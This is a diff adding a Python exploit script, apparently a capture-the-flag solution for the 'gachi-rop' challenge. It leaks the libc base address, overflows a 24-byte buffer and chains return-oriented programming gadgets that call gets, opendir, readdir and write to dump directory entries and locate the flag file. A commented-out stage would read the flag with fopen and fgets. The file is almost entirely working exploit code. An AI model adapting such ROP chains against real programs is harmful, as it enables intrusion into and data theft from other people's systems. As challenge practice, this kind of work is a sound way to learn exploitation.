@@ -1,0 +1,135 @@
+#!/usr/bin/env python
+import ptrlib as ptr
+import sys
+
+exe = ptr.ELF("./gachi-rop_patched")
+# exe = ptr.ELF("./gachi-rop")
+libc = ptr.ELF("./libc.so.6")
+# ld = ptr.ELF("")
+
+
+def connect():
+    if len(sys.argv) > 1 and sys.argv[1] == "remote":
+        return ptr.Socket("localhost", 4567)
+    else:
+        return ptr.Process(exe.filepath)
+
+
+def unwrap(x):
+    if x is None:
+        ptr.logger.error("unwrap failed")
+        exit(1)
+    else:
+        return x
+
+
+def main():
+    io = connect()
+
+    io.recvuntil("system@0x")
+    libc.base = int(io.recv(12), 16) - unwrap(libc.symbol("system"))
+
+    pl1 = b"A" * 24
+    pl1 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    pl1 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # dir name
+    pl1 += ptr.p64(unwrap(libc.symbol("gets")))
+
+    pl1 += ptr.p64(unwrap(exe.symbol("main")))
+
+    io.sendlineafter("Name: ", pl1)
+
+    # io.sendline("/home/ryohz/ctf/seccon-beginners2024/gachi-rop/gachi-rop/")
+    io.sendline("./ctf4b")
+
+    pl2 = b"A" * 24
+    # opendirでディレクトリを開く
+    pl2 += ptr.p64(next(libc.gadget("ret;")))
+    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # ./
+    pl2 += ptr.p64(unwrap(libc.symbol("opendir")))
+
+    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x10)  # dir metadata
+    pl2 += ptr.p64(next(libc.gadget("mov [rsi+0x10], rax; ret;")))
+
+    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
+    pl2 += ptr.p64(8)
+    pl2 += ptr.p64(0)
+    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
+    pl2 += ptr.p64(
+        next(
+            libc.gadget(
+                "mov rdi, [rsi+rdx-8]; sub rcx, rdi; or rax, rcx; cmovne eax, edx; ret;"
+            )
+        )
+    )
+
+    # readdirでディレクトリを読み込む
+    pl2 += ptr.p64(unwrap(libc.symbol("readdir")))
+
+    # writeでファイル名をダンプする
+    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x10)
+    pl2 += ptr.p64(next(libc.gadget("mov [rsi+0x10], rax; ret;")))
+    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # dir metadata
+    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
+    pl2 += ptr.p64(0)
+    pl2 += ptr.p64(0)
+    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x200)  # dummy
+    pl2 += ptr.p64(
+        next(libc.gadget("mov rsi, [rsi]; mov [rdi], rsi; mov [rdi+rdx-8], rcx; ret"))
+    )
+
+    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    pl2 += ptr.p64(1)
+
+    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
+    pl2 += ptr.p64(0x500)
+    pl2 += ptr.p64(0x500)
+
+    pl2 += ptr.p64(unwrap(libc.symbol("write")))
+
+    io.sendlineafter("Name: ", pl2)
+
+    # ダンプからフラグのファイルを取得
+    io.recvuntil("flag")
+    flag_file = "flag" + io.recvuntil(".txt").decode()
+    print(f"file_name = {flag_file}")
+
+    # pl2 = b"A" * 24
+    # pl2 += ptr.p64(next(libc.gadget("ret;")))
+    # pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
+    # pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x110)
+    # pl2 += ptr.p64(unwrap(libc.symbol("fopen")))
+
+    # pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x18)
+    # pl2 += ptr.p64(next(libc.gadget("mov [rdi+0x18], rax; mov eax, r8d; ret;")))
+    # pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
+    #
+    # pl2 += ptr.p64(next(libc.gadget("mov rdx, [rsi]; mov [rdi], rdx; ret;")))
+    # pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
+    # pl2 += ptr.p64(0x50)
+    # pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x120)
+    # pl2 += ptr.p64(unwrap(libc.symbol("fgets")))
+    # pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
+    # pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x120)
+    # pl2 += ptr.p64(unwrap(libc.symbol("puts")))
+    #
+    # io.sendlineafter("Name: ", pl2)
+    #
+    # io.sh()
+    # io.recvuntil("ctf4b")
+    # flag = "ctf4b" + io.recvuntil("}").decode()
+    # print(flag)
+
+
+if __name__ == "__main__":
+    main()
